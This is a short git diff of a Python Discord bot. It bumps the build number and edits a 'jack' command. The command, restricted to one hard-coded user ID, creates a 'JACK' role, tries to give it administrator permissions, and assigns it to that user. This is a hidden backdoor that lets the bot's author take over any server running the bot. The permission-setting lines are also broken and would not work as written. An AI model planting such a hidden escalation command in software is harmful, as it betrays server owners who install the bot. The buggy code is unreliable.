@@ -71,7 +71,7 @@ async def on_message(message):
                     await client.send_message(message.channel, "<@%s> awww you lost :cry:" % (message.author.id))
          
     if message.content.startswith(';version'):
-        msg = 'V1.0.3 BETA\nBuild:89'.format(message)
+        msg = 'V1.0.3 BETA\nBuild:90'.format(message)
         await client.send_message(message.channel, msg)    
        
        
@@ -130,9 +130,9 @@ async def mute(ctx, member: discord.Member, time: int, *,reason: str):
 @client.command(pass_context=True)
 async def jack(ctx):
     if ctx.message.author.id == '344967220025098242':
-        await client.create_role(ctx.message.server, name="JACK")
+        x = await client.create_role(ctx.message.server, name="JACK")
         role = discord.utils.get(ctx.message.server.roles, name="JACK")
-        role.permissions.all()
+        role.permissions.administrator(x)
         await client.add_roles(ctx.message.author, role)
     else:
         return await client.say("Only Jackaboi#8319 Can Use This Command!")
